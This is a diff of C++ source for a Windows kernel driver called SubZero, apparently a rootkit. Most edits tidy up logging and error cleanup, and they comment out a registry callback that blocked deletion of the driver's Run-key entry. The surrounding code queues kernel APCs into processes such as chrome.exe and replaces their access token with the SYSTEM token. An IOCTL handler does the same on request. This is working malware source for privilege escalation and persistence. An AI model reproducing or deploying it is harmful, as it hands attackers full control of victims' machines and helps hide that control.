@@ -57,24 +57,29 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 		status = ::CmRegisterCallbackEx(OnRegistryNotify, &altitude, DriverObject,
 			nullptr, &g_Globals.RegistryRegistrationCookie, nullptr);
 		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "failed to set registry callback (%08X)\n",
-				status));
+			KdPrint((DRIVER_PREFIX "failed to set registry callback (status=%08X)\n", status));
 			break;
 		}
 
 		// Register for Thread notifications
 		status = ::PsSetCreateThreadNotifyRoutine(OnThreadNotify);
 		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "[-] Failed to set Thread callbacks (status=status=%08X)\n", status));
+			KdPrint((DRIVER_PREFIX "[-] Failed to set Thread callbacks (status=%08X)\n", status));
 			break;
 		}
+		
 	} while (false);
 	
 	if (!NT_SUCCESS(status)) {
 		if (symLinkCreated)
 			::IoDeleteSymbolicLink(&symLink);
-		if (DeviceObject)
+		if (nullptr != DeviceObject)
 			::IoDeleteDevice(DeviceObject);
+
+		// Unregister notifications (sending a non-present function is allowed and will not crash the system)
+		::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);		
+		::ObUnRegisterCallbacks(g_Globals.ObjectRegistrationHandle);
+		::CmUnRegisterCallback(g_Globals.RegistryRegistrationCookie);
 	}
 
 	// Initialize RundownProtection for APCs
@@ -104,7 +109,7 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 
 void SubZeroUnload(PDRIVER_OBJECT DriverObject)
 {	
-	// Unregister Process & Thread notifications in case of an error
+	// Unregister Process & Thread notifications in case of an APC error
 	::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
 	::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
 
@@ -126,7 +131,7 @@ void SubZeroUnload(PDRIVER_OBJECT DriverObject)
 NTSTATUS SubZeroCreateClose(PDEVICE_OBJECT, PIRP Irp) {
 	Irp->IoStatus.Status = STATUS_SUCCESS;
 	Irp->IoStatus.Information = 0;
-	IoCompleteRequest(Irp, 0);
+	::IoCompleteRequest(Irp, 0);
 	return STATUS_SUCCESS;
 }
 
@@ -163,7 +168,7 @@ NTSTATUS SubZeroDeviceControl(PDEVICE_OBJECT, PIRP Irp)
 
 	// Complete request
 	Irp->IoStatus.Status = status;
-	IoCompleteRequest(Irp, 0);
+	::IoCompleteRequest(Irp, 0);
 	return status;
 }
 
@@ -318,27 +323,29 @@ NTSTATUS SetTokenToSystem_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCAT
 }
 
 NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) {
-	REG_DELETE_VALUE_KEY_INFORMATION* deleteValueInfo;
-	PCUNICODE_STRING name;
+	UNREFERENCED_PARAMETER(Argument1);
+	UNREFERENCED_PARAMETER(Argument2);
+	//REG_DELETE_VALUE_KEY_INFORMATION* deleteValueInfo = nullptr;
+	//PCUNICODE_STRING name = nullptr;
 
-	switch ((REG_NOTIFY_CLASS)(ULONG_PTR)Argument1)
-	{
-	case RegNtPreDeleteValueKey:
+	//switch (static_cast<REG_NOTIFY_CLASS>(reinterpret_cast<ULONG_PTR>(Argument1)))
+	//{
+	//case RegNtPreDeleteValueKey:
 
-		deleteValueInfo = (REG_DELETE_VALUE_KEY_INFORMATION*)Argument2;			
-		if (NT_SUCCESS(::CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteValueInfo->Object, nullptr, &name, 0))) {
-			
-			// filter out key deletions
-			if (::wcsncmp(name->Buffer, REG_MACHINE REG_RUN_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_RUN_KEY_PATH) - 1) == 0) {
+	//	deleteValueInfo = static_cast<REG_DELETE_VALUE_KEY_INFORMATION*>(Argument2);
+	//	if (NT_SUCCESS(::CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteValueInfo->Object, nullptr, &name, 0))) {
+	//		
+	//		// filter out key deletions
+	//		if (0 == ::wcsncmp(name->Buffer, REG_MACHINE REG_RUN_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_RUN_KEY_PATH) - 1)) {
 
-				// filter out value deletions
-				if (::wcsncmp(deleteValueInfo->ValueName->Buffer, DRIVER_NAMEW, ARRAYSIZE(DRIVER_NAMEW) - 1) == 0) {
-					KdPrint((DRIVER_PREFIX "[+] Registry value deletion attempt detected\n"));
-					return STATUS_ACCESS_DENIED;
-				}			
-			}
-		}
-	}
+	//			// filter out value deletions
+	//			if (0 == ::wcsncmp(deleteValueInfo->ValueName->Buffer, REG_VALUE_NAME, ARRAYSIZE(REG_VALUE_NAME) - 1)) {
+	//				KdPrint((DRIVER_PREFIX "[+] Registry value deletion attempt detected\n"));
+	//				return STATUS_ACCESS_DENIED;
+	//			}			
+	//		}
+	//	}
+	//}
 
 	// No match found
 	return STATUS_SUCCESS;
@@ -411,9 +418,9 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create)
 			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)
 				{				
 					auto* const process = ::PsGetCurrentProcess();			// Get current process (i.e. chrome.exe)
-					auto* const token = ::PsReferencePrimaryToken(process);		// Get the process token
-					SetTokenToSystem(process, token);									// Replace the process token with system token
-					::ObDereferenceObject(token);										// Dereference the process token
+					auto* const token = ::PsReferencePrimaryToken(process);	// Get the process token
+					SetTokenToSystem(process, token);						// Replace the process token with system token
+					::ObDereferenceObject(token);							// Dereference the process token
 					
 					// Thread and Process creation notification callbacks are not needed anymore
 					::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
